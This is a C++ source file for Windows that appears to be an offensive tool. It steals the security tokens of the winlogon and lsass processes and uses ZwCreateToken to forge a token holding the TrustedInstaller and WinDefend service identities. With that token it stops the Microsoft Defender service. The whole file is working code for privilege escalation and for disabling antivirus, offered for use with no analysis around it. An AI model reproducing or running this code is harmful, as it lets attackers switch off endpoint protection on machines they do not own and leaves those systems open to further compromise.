#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <tchar.h>
#include "ntdll.h"
#include <sddl.h>

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		_tprintf(TEXT("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		_tprintf(TEXT("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		_tprintf(TEXT("[-] The token does not have the specified privilege. \n"));
		return FALSE;
	}

	return TRUE;
}

std::wstring get_usernameW()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	return username_w;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}


BOOL StopDefenderService() {
	SERVICE_STATUS_PROCESS ssp;

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		_tprintf(TEXT("[-] OpenSCManager failed (%d)\n"), GetLastError());
		return FALSE;
	}

	_tprintf(TEXT("[+] OpenSCManager success!\n"));

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		L"WinDefend",            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	if (schService == NULL)
	{
		_tprintf(TEXT("[-] OpenService failed (%d)\n"), GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}
	_tprintf(TEXT("[+] OpenService success!\n"));

	//Stopping service

	if (!ControlService(
		schService,
		SERVICE_CONTROL_STOP,
		(LPSERVICE_STATUS)&ssp))
	{
		_tprintf(TEXT("[-] ControlService failed (%d)\n", GetLastError()));
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

}

int GetProcessByNameW(PCTSTR name)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32First(snapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (wcscmp(process.szExeFile, name) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	return NULL;
}

BOOL ImpersonateProcessTokenByNameW(PCTSTR pname, PHANDLE retHandle) {

	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;

	// Searching for Winlogon PID 
	DWORD PID_TO_IMPERSONATE = GetProcessByNameW(pname);

	if (PID_TO_IMPERSONATE == NULL) {
		_tprintf(TEXT("[-] %s process not found\n"), pname);
		return FALSE;
	}
	else
		_tprintf(TEXT("[+] %s process found!\n"), pname);

	// Call OpenProcess() to open WINLOGON, print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		_tprintf(TEXT("[+] %s OpenProcess() success!\n"), pname);
	else
	{
		_tprintf(TEXT("[-] %s OpenProcess() Return Code: %i\n"), pname, processHandle);
		_tprintf(TEXT("[-] %s OpenProcess() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE, &tokenHandle);
	if (GetLastError() == NULL)
		_tprintf(TEXT("[+] %s OpenProcessToken() success!\n"), pname);
	else
	{
		_tprintf(TEXT("[-] %s OpenProcessToken() Return Code: %i\n"), pname,  getToken);
		_tprintf(TEXT("[-] %s OpenProcessToken() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}


	if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, retHandle)){
		_tprintf(TEXT("[-] %s OpenProcessToken() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	
	_tprintf(TEXT("[+] %s DuplicateTokenEx() success!\n"), pname);

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(*retHandle);
	if (GetLastError() == NULL)
	{
		_tprintf(TEXT("[+] %s ImpersonatedLoggedOnUser() success!\n"), pname);
		_tprintf(TEXT("[+] %s Current user is: %s\n"), pname, (get_usernameW()).c_str());
	}
	else
	{
		_tprintf(TEXT("[-] %s ImpersonatedLoggedOnUser() Return Code: %i\n"), pname, getToken);
		_tprintf(TEXT("[-] %s ImpersonatedLoggedOnUser() Error: %i\n"), pname, GetLastError());
		return FALSE;
	}

	// Closing not necessary handles
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);

	// Print whoami to compare to thread later
	_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());

	return TRUE;
}

PVOID GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
{
	DWORD n;
	PVOID data;

	if (!GetTokenInformation(current_token, tic, 0, 0, &n) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	data = (PVOID)malloc(n);

	if (GetTokenInformation(current_token, tic, data, n, &n))
		return data;
	else
		free(data);

	return 0;
}


HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
{
	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	DWORD sessionId;
	HANDLE elevated_token;
	//PTOKEN_STATISTICS stats;
	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	PISID pSidSingle;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
	PSID lpSidOwner = NULL;
	LUID authid = SYSTEM_LUID;
	_ZwCreateToken ZwCreateToken;

	/*
	const SID6 TrustedInstallerSid = {
	{
		SID_REVISION, SECURITY_SERVICE_ID_RID_COUNT, SECURITY_NT_AUTHORITY, { SECURITY_SERVICE_ID_BASE_RID }
	},
	{
		SECURITY_TRUSTED_INSTALLER_RID1,
			SECURITY_TRUSTED_INSTALLER_RID2,
			SECURITY_TRUSTED_INSTALLER_RID3,
			SECURITY_TRUSTED_INSTALLER_RID4,
			SECURITY_TRUSTED_INSTALLER_RID5,
	}
	};
	*/
	//SID_BUILTIN TkSidLocalServiceGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, SECURITY_SERVICE_ID_BASE_RID } };

	PSID group1, group2;
	// TrustedInstaller SID
	BOOL t = ConvertStringSidToSid(TEXT("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"), &group2);

	//Windefend SID
	t = ConvertStringSidToSid(TEXT("S-1-5-80-1913148863-3492339771-4165695881-2087618961-4109116736"), &group1);


	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}

	DWORD dwBufferSize = 0;
	PTOKEN_USER user;
	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);

	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;

	//stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
	//privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 2));
	privileges = (PTOKEN_PRIVILEGES)GetInfoFromToken(base_token, TokenPrivileges);

	//get_system_privileges(privileges);
	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);

	pSid = groups->Groups;
	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_AUTHENTICATED_USER_RID) {
			pSid->Sid = group1;
			pSid->Attributes = SE_GROUP_ENABLED;
		}

		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_WORLD_RID) {
			pSid->Sid = group2;
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_ADMINS) {
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = user->User.Sid;
	//owner->Owner = GetLocalSystemSID();

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		TokenImpersonation,
		pluidAuth,
		pli,
		user,
		//&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken // creates an anonymous impersonation token
	);

	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);

	FreeSid(lpSidOwner);
	//if (stats) LocalFree(stats);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	return NULL;
}


int __cdecl _tmain(int argc, TCHAR* argv[]) {




	
	// Add SE debug privilege
	/*
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		_tprintf(L"[+] SeDebugPrivilege enabled!\n");
	}
	*/

	

	// Print whoami to compare to thread later
	_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());

	HANDLE impersonatedTokenHandle = NULL;
	if (!ImpersonateProcessTokenByNameW(TEXT("winlogon.exe"), &impersonatedTokenHandle))
		exit(1);
	
	if (!ImpersonateProcessTokenByNameW(TEXT("lsass.exe"), &impersonatedTokenHandle))
		exit(1);


	impersonatedTokenHandle = CreateTokenWinDefend(impersonatedTokenHandle, FALSE);

	if (impersonatedTokenHandle == NULL)
		exit(1);
	
	_tprintf(TEXT("[+] CreateTokenWinDefend success!\n"));

	if (ImpersonateLoggedOnUser(impersonatedTokenHandle))
	{
		_tprintf(TEXT("[+] ImpersonatedLoggedOnUser() success!\n"));
		_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());
	}
	else
	{
		_tprintf(TEXT("[-] ImpersonatedLoggedOnUser() Error: %i\n"), GetLastError());
		return FALSE;
	}
	
	if (StopDefenderService()) {
		_tprintf(TEXT("[+] StopDefenderService() success!\n"));
	}
	else {
		_tprintf(TEXT("[-] StopDefenderService() Error: %i\n"), GetLastError());
	}
	
	return 0;
}